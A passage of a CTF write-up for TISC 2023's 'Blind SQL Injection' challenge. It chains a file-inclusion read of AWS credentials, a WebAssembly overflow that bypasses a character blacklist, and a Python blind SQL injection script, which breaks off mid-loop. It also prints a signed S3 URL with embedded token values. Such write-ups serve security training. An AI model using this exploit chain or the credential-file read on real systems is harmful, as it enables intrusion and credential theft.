6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-8"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a aria-current="page" href="/ctf-writeups/writeups/blind-sql-injection" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-2xl opacity-40 mb-1">03/10/2023</span><h1 class="mb-7">Blind SQL Injection</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>As part of the anti-PALINDROME task force, you find yourself face to face with another task.</p>
<p>"We found this horribly made website on their web servers," your superior tells you. "It's probably just a trivial SQL injection vulnerability to extract the admin password. I'm expecting this to be done in about an hour."</p>
<p>You ready your fingers on the keyboard, confident that you'll be able to deliver.</p>
<p><a href="http://chals.tisc23.ctf.sg:28471/">http://chals.tisc23.ctf.sg:28471/</a></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">language</i><span class="mr-4 text-black font-semibold">web</span></div><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">keyboard_double_arrow_left</i><span class="mr-4 text-black font-semibold">rev</span></div><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">bug_report</i><span class="mr-4 text-black font-semibold">pwn</span></div><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">cloud</i><span class="mr-4 text-black font-semibold">cloud</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">18 solves</span><span class="opacity-60">0 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by unknown</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://api.tisc.csit-events.sg/file?id=clmdje3ze2oee088694zub7xx&amp;name=Dockerfile" class="underline">Dockerfile</a><a href="https://api.tisc.csit-events.sg/file?id=clmdje4292oex08860d9xddn2&amp;name=server.js" class="underline">server.js</a><a href="https://api.tisc.csit-events.sg/file?id=clmdje4592ofg0886nr2wi4xd&amp;name=db-init.sql" class="underline">db-init.sql</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>Opening the site, I am greeted with a login page. I tried some sql injection payloads but they were blocked by a blacklist. Hence, I wrote a quick python script to fuzz all allowed characters, and got: <code>"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</code>. Obviously, sql injection is not possible with only alphabets, so we need to find something else. I looked at the source code provided.</p>
<p>I saw there was a LFI vulnerability in server.js:</p>
<pre class="named-fence-block"><code class="language-javascript">app.post('/api/submit-reminder', (req, res) =&gt; {
    const username = req.body.username;
    const reminder = req.body.reminder;
    const viewType = req.body.viewType;
    res.send(pug.renderFile(viewType, { username, reminder }));
});
</code><div class="named-fence-filename">server.js</div></pre>
<p>Looking at the Dockerfile, it seems that there is a aws config folder at <code>/root/.aws</code>. Hence, we can access the credentials by sending a post request to <code>/api/submit-reminder</code> with viewType as <code>/root/.aws/credentials</code>. This is the response:</p>
<p><img src="/ctf-writeups/tisc23/blind-sql-injection-0.png" alt=""></p>
<p>I set the credentials using <code>aws configure</code>.</p>
<p>To list the permissions available, I tried using the <code>getUserIamPermissions.sh</code> script from level 7, however it didn't work because the credentials did not have the necessary permissions.</p>
<p>However, there is a lambda function invocation of <code>craft_query</code> in the code, hence I deduced that I would be able to get the function. I ran <code>aws lambda get-function --function-name craft_query</code>. This returned a large json response with a link to the code:</p>
<pre><code class="language-json">...

  "Code": {
    "RepositoryType": "S3",
    "Location": "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/craft_query-a989953b-8c24-41f0-ac22-813b4ca32bbc?versionId=JNLr5qtX.LFHg63fpryY.eZVBru5aTvH&amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjECQaDmFwLXNvdXRoZWFzdC0xIkgwRgIhAPWbYE%2FW7LQeM1c%2BY6GZjL4i4%2BRBpUJOc1xIARN7vDOPAiEA83kkf81hFV2K4SfoFT2q70i2%2Bs95HxJ1cb7IuCAxb5AqwAUILRAEGgwyOTUzMzg3MDM1ODMiDMeA9zfqSUVUNA1frSqdBd5TVP2%2FlOom3eVELxgmxgyQLxQ7lr0CBpEg3lI%2B%2F5wILSzWB9E8BYSEuDSQOlYKArG6LE2jdXcEsXm2PGXe3pK%2F97GvZGOiIJrdVRfKVW9Y%2FZYerD1X6inPYz1u%2BmvVDhZZYzm7umrwNNOybY2A0GjXt7uUUxOy16Gy8GuZExynIEEYeC81%2BBMA6ieLn8osUGDDh%2BAfSj9vWV56YlKz2qI4DTNaz7%2BbVxCYLXr3sIL%2FPN%2BnXq1xF6M6sWbtFnYw58t6Duf5W1gBI%2BGp5EnDXlVbRQrTqo4A6xZVoTEe5B6iGNJq629qEjUZvah4lafSIqqV6MLnoSf5K1tLAJSvQmDGirbHx%2F6B85tC5gEfP9WZlFaKhdOoJWQBOypyu6LzfUld6TOK1ZssoJVED3p211j4mk4lCQp6trcRkPaWJnLGmH5YrJ40wmsWjcTQpM5JpIUWxNcDinWDlAP5cjwLpjk3sy5FExeRYH%2B6%2FRrR1NuJCevzOcXc1Xblnn%2FWNDM8I3GDxHAgRZLLyV3MiJkhmJLt0w4eSTAdOSnXskRzhJiwXu11yQAsbJIb58ZkXf3hHarIg6jgYMreSStiatH3bSRFtqEowEKPtMGwyMYgMNu4ZzQM%2Fc7GruI1aWQWgwrmwxTmaJTQ1k4mSVqCuKUxU%2F2KVmdoCeUq3%2F0yXGSMsWv30SH8tFVt4sSxFNQSHwrhaJBIaclVAbpRPkwxOwK04cC6oUOuzJBAfTZV7NIAW0rFcPelO1qnOFnGaXEA1P0TnEJ5ZAAsz7hnEi3GUM1PPYvdpN6FA2KbvDvU7i%2BKpFfiUA%2BTiRY0QbpeN9dXT9KDJrMDDjL4903hWqyQOEqLletQKQU%2Bmz%2FDm%2Bmtw6xOf8%2FGYdV4M3sNJu0VkQIJXDCJgPCoBjqwAdcXEkuE%2BsHOCZjSNqyj7Dx89h%2FbJO2Y%2Brtit8QmiInVu5rkvoIia9rrC%2FNUa3APGV1t1Iskn3NyxsywLXl1rkvC7ONpkrbfH%2FUwzxzxVVJ6fO76u9zsDdpZXg8MLWwzhOYb%2BtSG9FrJn4VwkMVr4MZmykXsKP%2BkeNBaYWdboV3R8vghydMTjNhG2kMSrcvDUSHT0DD7UckOH0wvN3xvRW97vk3phBssxvVpwWAzajN7&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=20231003T124953Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Credential=ASIAUJQ4O7LP4VD3LLND%2F20231003%2Fap-southeast-1%2Fs3%2Faws4_request&amp;X-Amz-Signature=06d27d9e23c01d8a7e9ab9fb19dd185864028bd5ffa623ab301e5d471ba05f41"
  }

...
</code></pre>
<p>Clicking the link downloaded a zip file, which when extracted gave 3 files: <code>index.js</code>, <code>site.js</code>, and <code>site.wasm</code>.</p>
<p>It seems that <code>index.js</code> and <code>site.js</code> are just used to connect the webassembly binary to the lambda function, and the main logic is in the binary. At this point, I did some reading up on webassembly exploitation before continuing, since I had no prior experience with it.</p>
<p>I disassembled the binary using <code>wasm-decompile</code>, and wrote a quick script to inline variables since the decompiled output contained a lot of "un-inlined constants". Here is the script:</p>
<pre class="named-fence-block"><code class="language-python">from collections import namedtuple
import re


def consume_identifier(line, i):
    start = i
    while i &lt; len(line) and (line[i].isalpha() or line[i] == '_'):
        i += 1
    return i, line[start:i]


def all_remaining_identifiers(line, i):
    names = []
    while i &lt; len(line):
        while i &lt; len(line) and not (line[i].isalpha() or line[i] == '_'):
            i += 1
        if i &gt;= len(line):
            break

        name_i = i
        i, name = consume_identifier(line, i)
        names.append((name, name_i, i))
    return names


class Expr:
    def __init__(self, expr, used_vars, can_be_removed):
        self.expr = expr
        self.used_vars = used_vars
        self.can_be_removed = can_be_removed
    def __repr__(self):
        return 'Expr({!r}, {!r}, {!r})'.format(self.expr, self.used_vars, self.can_be_removed)


def clean_function(lines):
    redundant_vars = {}
    exprs_to_replace = []
    cleaned_lines = [line for line in lines]
    assignments = []
    num_usages = {}


    for line_no, line in enumerate(lines):
        i = 0
        while line[i] == ' ':
            i += 1
        
        if line[i:].startswith('var ') and ' = ' in line:
            i += 4
            i, name = consume_identifier(line, i)
            expression = line.split(' = ')[1][:-2]  # remove ;\n
            if not re.search(r'[a-zA-Z_]\(', expression):
                # check that does not contain a function call
                # if has a function call, cannot move it
                used_vars = all_remaining_identifiers(expression, 0)
                redundant_vars[name] = Expr(expression, used_vars, True)
                assignments.append((line_no, name))

        elif ' = ' in line:
            # reassignment
            i, name = consume_identifier(line, i)
            if name in redundant_vars:
                redundant_vars[name].can_be_removed = False

        used_vars = all_remaining_identifiers(line, 0)
        for name, _, _ in used_vars:
            num_usages[name] = num_usages.get(name, 0) + 1
        exprs_to_replace.append((line_no, used_vars))


    def clean_expr(expr):
        expr_s = expr.expr
        for name, start, end in reversed(expr.used_vars):
            if name in redundant_vars and redundant_vars[name].can_be_removed:
                expr_s = expr_s[:start] + clean_expr(redundant_vars[name]) + expr_s[end:]
        if ' ' in expr_s:
            expr_s = '(' + expr_s + ')'
        return expr_s


    for line_no, used_vars in reversed(exprs_to_replace):
        i = cleaned_lines[line_no].find(' = ') + 3
        for name, start, end in reversed(used_vars):
            if name in redundant_vars and redundant_vars[name].can_be_removed:
                cleaned_lines[line_no] = cleaned_lines[line_no][:start] + clean_expr(redundant_vars[name]) + cleaned_lines[line_no][end:]
                num_usages[name] -= 1

    for line_no, name in reversed(assignments):
        if num_usages[name] &lt; 0:
            print('ERROR:', name)
        if num_usages[name] == 0:
            cleaned_lines.pop(line_no)

    return cleaned_lines


def main():
    with open('site.dcmp') as f:
        lines = f.readlines()
    
    i = 0
    while i &lt; len(lines):
        if lines[i].startswith('function ') or lines[i].startswith('export function '):
            end_i = lines.index('}\n', i)
            cleaned_lines = clean_function(lines[i+1:end_i])
            lines = lines[:i+1] + cleaned_lines + lines[end_i:]
            i += len(cleaned_lines) + 1
        i += 1

    with open('out.dcmp', 'w') as f:
        f.write(''.join(lines))

main()
</code><div class="named-fence-filename">cleaner.py</div></pre>
<p>Essentially, it converts code like</p>
<pre><code class="language-plaintext">var c:int = g_a;
var d:int = 160;
var e:int = c - d;
</code></pre>
<p>to</p>
<pre><code class="language-plaintext">var e:int = g_a - 160;
</code></pre>
<p>where c and d variables are not used anywhere else. Now, the code was a bit more readable. Here is the updated craft_query function:</p>
<pre><code class="language-plaintext">export function craft_query(username:int, password:int):int {
	var e:int = DATA - 160;
	DATA = e;
	e[39]:int = username;
	e[38]:int = password;
	e[37]:int = 1;
	e[3]:int = 1;
	e[2]:int = 2;
	f_1(e + 80, e[39]:int);
	f_2(e + 16, e[38]:int, 59);
	e[75]:byte = 0;
	var z:int = call_indirect(e + 80, e + 16, e[37]:int);
	DATA = e + 160;
	return z;
}
</code></pre>
<p>Next, I looked at the function <code>f_1</code>.</p>
<pre><code class="language-plaintext">function f_1(ptr:int, username:int) {
	var e:int_ptr = DATA - 32;
	DATA = e;
	e[7] = ptr;
	e[6] = username;
	loop L_b {
		if (eqz((e[6][0] &amp; 255 != 0) &amp; 1)) goto exit;
		if (eqz(((e[6][0] &lt;&lt; 24) &gt;&gt; 24 == 37))) goto B_d;  # %
		var fa:int = hex_to_int(((e[6][1] &lt;&lt; 24) &gt;&gt; 24));
		e[5] = fa;
		var la:int = hex_to_int(((e[6][2] &lt;&lt; 24) &gt;&gt; 24));
		e[4] = la;
		if (eqz(((e[5] != -1) &amp; 1))) goto B_f;
		if (eqz(((e[4] != -1) &amp; 1))) goto B_f;
		e[3] = ((e[5] &lt;&lt; 4) + e[4]);
		e[6] = (e[6] + 3);
		utf8encoding(e[7], e[3]);
		var lb:int = strlen(e[7]);
		e[7] = (e[7] + lb);
		goto B_e;
		label B_f:
		e[6] = (e[6] + 1);
		var sb:byte_ptr = e[7];
		e[7] = (sb + 1);
		sb[0] = e[6][0];
		label B_e:
		goto B_c;
		label B_d:
		e[6] = (e[6] + 1);
		var zb:byte_ptr = e[7];
		e[7] = (zb + 1);
		zb[0] = e[6][0];
		label B_c:
		continue L_b;
	}
	unreachable;
	label exit:
	e[7][0] = 0;
	DATA = e + 32;
}
</code></pre>
<p>I analysed the functions <code>hex_to_int</code>, <code>utf8encoding</code> and <code>strlen</code> by reading the code, and I renamed them accordingly. So the function seems to be copying all the bytes in username to a buffer, and it provides url decoding.</p>
<p>Next, I needed to setup a work environment so I could test the wasm binary. After trying various tools unsuccessfully, I eventually just modified <code>index.js</code> to run the function and print the result:</p>
<pre class="named-fence-block"><code class="language-javascript">...

(async () =&gt; {
  CraftQuery = await initializeModule();
  const result = CraftQuery('A', 'B');
  console.log(result);
})();
</code><div class="named-fence-filename">index.js</div></pre>
<p>This produced <code>SELECT * from Users WHERE username="A" AND password="B"</code> as expected. I now tried to test for a buffer overflow. Passing <code>"A".repeat(100)</code> as the username gave a <code>memory access out of bounds</code> error - a sign there was indeed some buffer overflow.</p>
<p>Using binary search, I narrowed it down to 67 characters, and passing an additional character gave a <code>null function or function signature mismatch</code> error. I needed to inspect the state of the memory, hence I wrote the memory buffer to a file:</p>
<pre class="named-fence-block"><code class="language-javascript">...

(async () =&gt; {
  CraftQuery = await initializeModule();
  const result = CraftQuery('A'.repeat(67), 'B');
  console.log(result);
  require('fs').writeFileSync('mem.bin', Buffer.from(EmscriptenModule.asm.memory.buffer));
})();
</code><div class="named-fence-filename">index.js</div></pre>
<p>Additionally, I added similar code to <code>site.js</code> so that a memory dump would be produced in event of an error:</p>
<pre class="named-fence-block"><code class="language-javascript">...

process.on('uncaughtException', (ex) =&gt; {
  // suppress ExitStatus exceptions from showing an error
  if (ex !== 'unwind' &amp;&amp; !(ex instanceof ExitStatus) &amp;&amp; !(ex.context instanceof ExitStatus)) {
    require('fs').writeFileSync('mem.bin', Buffer.from(wasmMemory.buffer));
    throw ex;
  }
});

...
</code><div class="named-fence-filename">site.js</div></pre>
<p>I wrote a python script to then inspect the memory:</p>
<pre class="named-fence-block"><code class="language-python">with open('mem.bin', 'rb') as f:
    data = f.read()

i = data.find(b'A'*67)
print(i)
print(data[i-100:i+100])
</code><div class="named-fence-filename">ex_mem.py</div></pre>
<p>This gave the output:</p>
<pre><code class="language-plaintext">65360
b'P\xff\x00\x00\x00\x00\x00\x00\x10\xff\x00\x00P\xff\x00\x00`\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x01\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
</code></pre>
<p>It seems that right after the list of As there is a 0x1 byte. The memory dump from passing 68 As as the argument shows that this byte is overwritten by a null byte.</p>
<pre><code class="language-plaintext">65360
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf4\xff\x00\x00\x94\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
</code></pre>
<p>I reasoned that this null byte was written to indicate the end of string. Looking at the error message produced, <code>null function or function signature mismatch</code>, I postulated that the 0x1 was referring to an entry in the webassembly function table. I listed the entries in this table with the code:</p>
<pre class="named-fence-block"><code class="language-javascript">...

  const table = EmscriptenModule.asm.__indirect_function_table;
  console.log(table.length);
  for (let i = 0; i &lt; table.length; i++) {
    console.log(table.get(i));
  }

...
</code><div class="named-fence-filename">site.js</div></pre>
<pre class="named-fence-block"><code class="language-plaintext">null
[Function: 8]
[Function: 6]
[Function: 40]
[Function: 41]
[Function: 44]
</code><div class="named-fence-filename">output</div></pre>
<p>To determine what functions these correspond to, I ran <code>wasm2wat site.wasm -o site.wat</code> and found the following:</p>
<pre class="named-fence-block"><code class="language-plaintext">...

  (export "__wasm_call_ctors" (func 1))
  (export "load_query" (func 6))
  (export "is_blacklisted" (func 8))
  (export "craft_query" (func 9))

...
</code><div class="named-fence-filename">site.wat</div></pre>
<p>So the function in table entry 1 is <code>is_blacklisted</code>, and the function in table entry 2 is <code>load_query</code>. Looking at the code, it seems that <code>is_blacklisted</code> checks if there are any blacklisted characters used, and if not it calls <code>load_query</code>, which seems to return the final sql query. So by overwriting the 0x1 byte with 0x2, we can bypass the blacklist! Also, we can use the url decoding method to write the 0x2 byte.</p>
<p>I ran the function with blacklisted characters: <code>CraftQuery('"'.repeat(68) + '%02', 'B')</code>, and sure enough, the blacklist was bypassed.</p>
<pre><code class="language-sql">SELECT * from Users WHERE username="""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" AND password="B"
</code></pre>
<p>Now we have sql injection. Referring to the <code>db-init.sql</code> file provided, I saw that we needed to get the password of the admin. Unfortunately however, server.js does not give us the results of the sql query.</p>
<pre class="named-fence-block"><code class="language-javascript">...

db.query(sql, (err, results) =&gt; {
    if (err) {
        req.flash('error', 'Uh oh. Something went wrong.');
        req.session.save(() =&gt; {
            res.redirect('/');
        });
    } else if (results.length !== 0) {
        res.redirect(`/reminder?username=${username}`);
    } else {
        req.flash('error', 'Invalid username/password');
        req.session.save(() =&gt; {
            res.redirect('/');
        });
    }
});

...
</code><div class="named-fence-filename">server.js</div></pre>
<p>Fortunately, though, it does provide us with information on whether 0 rows were returned by the query. We can extract the flag character by character, for example, using a query such as <code>admin" and binary substring(password, 1, 1) = "T";#</code> to check whether the first character is <code>T</code>, and we check through all possible characters for each index.</p>
<p>Here is my final solve script:</p>
<pre class="named-fence-block"><code class="language-python">import requests
import subprocess
from string import ascii_letters, digits

possible = ascii_letters + digits + '_'

url = 'http://chals.tisc23.ctf.sg:28471/api/login'

j = 6
ans = 'TISC{'
while True:
    for c in possible:
        print(str(j) + ': trying ' + c)
        pay0 = f'admin" and binary substring(password, {j}, 1) = "{c}";#'
        pay1 = pay0
        pay1 += 'A' * (68 - len(pay0)) + '%02'

        i = 1
        correct = False
        while True:
            if i % 50 == 0:
                print(i)
            resp = requests.post(url, data={'username': pay1, 'password': 'B'})
            if ('Something went wrong' not in resp.text):
                if 'Welcome, admin' in resp.text:
                    correct = True
